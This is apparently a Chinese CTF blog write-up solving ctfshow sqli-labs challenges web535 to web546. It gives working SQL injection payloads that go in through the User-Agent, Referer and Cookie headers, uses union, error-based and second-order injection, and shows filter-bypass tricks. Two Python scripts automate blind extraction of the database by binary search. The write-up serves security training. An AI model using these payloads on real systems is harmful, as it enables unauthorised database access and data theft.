<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">left</span>((<span class="keyword">select</span> flag4 <span class="keyword">from</span> ctfshow.flag),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">right</span>((<span class="keyword">select</span> flag4 <span class="keyword">from</span> ctfshow.flag),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>至于这里前面的单引号，去掉传进去看到语法错误就知道为什么了</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;, &#x27;172.12.23.142&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>其实也就是根据语句中UA头用单引号包裹做的一个闭合操作，后面的话也可以直接用#注释掉</p>
<h2 id="web535"><a href="#web535" class="headerlink" title="web535"></a>web535</h2><h3 id="Rerferer头单引号报错注入"><a href="#Rerferer头单引号报错注入" class="headerlink" title="#Rerferer头单引号报错注入"></a>#Rerferer头单引号报错注入</h3><p>传入弱口令登录后返回Rerferer头信息，尝试打报错注入</p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,(select <span class="built_in">version</span>()),<span class="number">0</span>x7e),<span class="number">1</span>) and &#x27;</span><br></pre></td></tr></table></figure>

<p>那就直接打</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">left</span>((<span class="keyword">select</span> flag4 <span class="keyword">from</span> ctfshow.flag),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">right</span>((<span class="keyword">select</span> flag4 <span class="keyword">from</span> ctfshow.flag),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="web536"><a href="#web536" class="headerlink" title="web536"></a>web536</h2><h3 id="Cookie头单引号报错注入"><a href="#Cookie头单引号报错注入" class="headerlink" title="#Cookie头单引号报错注入"></a>#Cookie头单引号报错注入</h3><p>传入admin&#x2F;admin弱口令后返回cookie信息</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604154453790.png" alt="image-20250604154453790"></p>
<p>那我们对当前Cookie的uname进行注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select version()),<span class="number">0</span>x7e),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604155223814.png" alt="image-20250604155223814"></p>
<p>然后注入就行了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),<span class="number">0</span>x7e),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"><span class="attribute">uname</span>=admin&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),<span class="number">0</span>x7e),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"><span class="attribute">uname</span>=admin&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,left((select flag4 from ctfshow.flag),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>)#</span><br><span class="line"><span class="attribute">uname</span>=admin&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,right((select flag4 from ctfshow.flag),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="web537"><a href="#web537" class="headerlink" title="web537"></a>web537</h2><h3 id="Cookie头单引号-编码报错注入"><a href="#Cookie头单引号-编码报错注入" class="headerlink" title="#Cookie头单引号+编码报错注入"></a>#Cookie头单引号+编码报错注入</h3><p>这次Cookie头做了一个base64编码处理</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604160309527.png" alt="image-20250604160309527"></p>
<p>我们也正常传入编码字符串</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span><span class="operator">=</span>YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHZlcnNpb24oKSksMHg3ZSksMSkj</span><br></pre></td></tr></table></figure>

<p>但是好像#号的注释作用没了</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604160613676.png" alt="image-20250604160613676"></p>
<p>我们用闭合吧</p>
<p>例如查询版本</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin</span>&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select version()),<span class="number">0</span>x7e),<span class="number">1</span>) and &#x27;</span><br></pre></td></tr></table></figure>

<p>base64编码后传入就行</p>
<h2 id="web538"><a href="#web538" class="headerlink" title="web538"></a>web538</h2><h3 id="Cookie双引号-编码报错注入"><a href="#Cookie双引号-编码报错注入" class="headerlink" title="#Cookie双引号+编码报错注入"></a>#Cookie双引号+编码报错注入</h3><p>传入双引号后产生报错</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span><span class="operator">=</span>Ig<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604161505213.png" alt="image-20250604161505213"></p>
<p>说明是双引号闭合</p>
<p>也是直接打就行</p>
<h2 id="web539"><a href="#web539" class="headerlink" title="web539"></a>web539</h2><h3 id="单引号前后闭合union"><a href="#单引号前后闭合union" class="headerlink" title="#单引号前后闭合union"></a>#单引号前后闭合union</h3><p>测了一下是单引号闭合但是注释符号被过滤了，只能试着去闭合了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1 正常回显查询信息</span><br></pre></td></tr></table></figure>

<p>然后我们用union联合注入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3 2和3有回显</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>),<span class="string">&#x27;3 表名为flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="string">&#x27;3 字段名有flag4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag4 <span class="keyword">from</span> ctfshow.flag),<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure>

<h2 id="web540"><a href="#web540" class="headerlink" title="web540"></a>web540</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="#二次注入"></a>#二次注入</h3><p>一个登录口，忘记密码的选项没什么用，登录口也没什么注入的地方</p>
<p>找到一个注册口new_user.php，这里的话注册发现传入特殊字符之后会被转义，所以我们打二次注入</p>
<p>猜测登录后的修改密码的语句是单引号闭合，我们注册一个<code>admin&#39;#</code>的账号</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604165535512.png" alt="image-20250604165535512"></p>
<p>然后在里面修改密码，猜测后台修改密码的语句是</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> users <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>所以插入后如果特殊字符不被转义的话就能进行注入攻击，但是这里没有回显，我们只能打盲注</p>
<p>我们先测一下延迟时间</p>
<p>先注册一个能延迟的语句</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin&#x27; and if(<span class="number">1</span>&lt;<span class="number">2</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)#</span><br><span class="line"><span class="attribute">password</span>=<span class="number">1</span></span><br><span class="line"><span class="attribute">re_password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后修改密码的时候触发，发现延迟就是3秒左右，那我们写脚本吧</p>
<p>需要注意的是，这里需要用到session，不然登录的时候会出问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/login_create.php&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/pass_change.php&quot;</span></span><br><span class="line">url3 = <span class="string">&quot;http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/login.php&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#注册页面传入恶意数据</span></span><br><span class="line">        <span class="comment">#payload1 = f&quot;admin&#x27; and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload1 = f&quot;admin&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload1 = f&quot;admin&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)-- &quot;</span></span><br><span class="line">        payload1 = <span class="string">f&quot;admin&#x27; and if(ascii(substr((select flag4 from ctfshow.flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),0)-- &quot;</span></span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload1,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;re_password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Register&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r1 = session.post(url1, data=data1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#登录账号</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&quot;login_user&quot;</span> : payload1,</span><br><span class="line">            <span class="string">&quot;login_password&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;mysubmit&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r2 = session.post(url3, data=data2)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#触发注入</span></span><br><span class="line">        data3 = &#123;</span><br><span class="line">            <span class="string">&quot;current_password&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;re_password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Reset&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r3 = session.post(url2, data=data3)</span><br><span class="line">        end = time.time() - start</span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web541-542"><a href="#web541-542" class="headerlink" title="web541&amp;542"></a>web541&amp;542</h2><h3 id="过滤and和or"><a href="#过滤and和or" class="headerlink" title="#过滤and和or"></a>#过滤and和or</h3><p>页面提示过滤了and和or，用管道符绕过就行了，<code>and</code>用<code>&amp;&amp;</code>替换，<code>or</code>用<code>||</code>替换，当然也可以用双写去绕过，因为后面打注入的时候需要绕过，刚好这里只是做了一个替换的过滤</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>&#x27;||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">--+回显</span></span><br><span class="line">?id=-<span class="number">1</span>&#x27;||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2&#x27;</span><span class="comment">--+无回显</span></span><br></pre></td></tr></table></figure>

<p>后面的话可以打盲注也可以打报错注入，不过我自己报错注入学的比较少，所以还是选择迎难而上 打extractvalue报错</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="string">&#x27;||extractvalue(1,concat(0x7e,(select version()),0x7e))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>)<span class="keyword">from</span> infoorrmation_schema.schemata),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27;||extractvalue(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema=&#x27;</span>ctfshow<span class="string">&#x27;),0x7e))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>)<span class="keyword">from</span> infoorrmation_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flags&#x27;</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27;||extractvalue(1,concat(0x7e,left((select flag4s from ctfshow.flags),30),0x7e))--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,right((<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags),<span class="number">30</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="web543"><a href="#web543" class="headerlink" title="web543"></a>web543</h2><h3 id="增加过滤space和注释"><a href="#增加过滤space和注释" class="headerlink" title="#增加过滤space和注释"></a>#增加过滤space和注释</h3><p>这道题增加过滤了空格和注释，注释可以用单引号主动闭合，空格的话我发现编码绕不过去，只能用括号绕过了</p>
<p>其实报错注入的话也是不怎么需要空格的，可以打报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(version()),0x7e),1)||&#x27;</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),0x7e),1)||&#x27;</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;ctfshow&#x27;)),0x7e),1)||&#x27;</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;flags&#x27;)),0x7e),1)||&#x27;</span><br></pre></td></tr></table></figure>

<p>盲注也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;ctfshow&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&#x27;0</span><br></pre></td></tr></table></figure>

<h2 id="web544"><a href="#web544" class="headerlink" title="web544"></a>web544</h2><h3 id="增加过滤space和注释-1"><a href="#增加过滤space和注释-1" class="headerlink" title="#增加过滤space和注释"></a>#增加过滤space和注释</h3><p>这次就用盲注吧，不过这里得用id&#x3D;0，id&#x3D;-1的结果是查得出来的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;||if(1&gt;0,1,0)||&#x27;</span>有回显</span><br><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;||if(1&lt;0,1,0)||&#x27;</span>无回显</span><br></pre></td></tr></table></figure>

<p>然后写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8189ea51-4f5f-49f1-b344-3b556d3c79ce.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=0&#x27;||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;ctfshow&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=0&#x27;||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;flags&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=0&#x27;||if(ascii(substr((select(flag4s)from(ctfshow.flags)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)||&#x27;&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web545"><a href="#web545" class="headerlink" title="web545"></a>web545</h2><h3 id="单引号增加过滤union和select"><a href="#单引号增加过滤union和select" class="headerlink" title="#单引号增加过滤union和select"></a>#单引号增加过滤union和select</h3><p>这次好像and和or没被过滤了，但是过滤了union和select，可以用大小写或者双写绕过</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(<span class="keyword">sElect</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="string">&#x27;ctfshow&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">sElect</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">&#x27;flags&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">left</span>((<span class="keyword">sElect</span>(flag4s)<span class="keyword">from</span>(ctfshow.flags)),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>||updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">right</span>((<span class="keyword">sElect</span>(flag4s)<span class="keyword">from</span>(ctfshow.flags)),<span class="number">30</span>),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="web546"><a href="#web546" class="headerlink" title="web546"></a>web546</h2><h3 id="双引号增加过滤union和select"><a href="#双引号增加过滤union和select" class="headerlink" title="#双引号增加过滤union和select"></a>#双引号增加过滤union和select</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">0</span><span class="string">&quot;||0||&quot;</span> 无回显</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">0</span><span class="string">&quot;||1||&quot;</span> 有回显</span><br></pre></td></tr></table></figure>

<p>好像报错信息被禁用了无法打报错注入，那就打盲注吧</p>
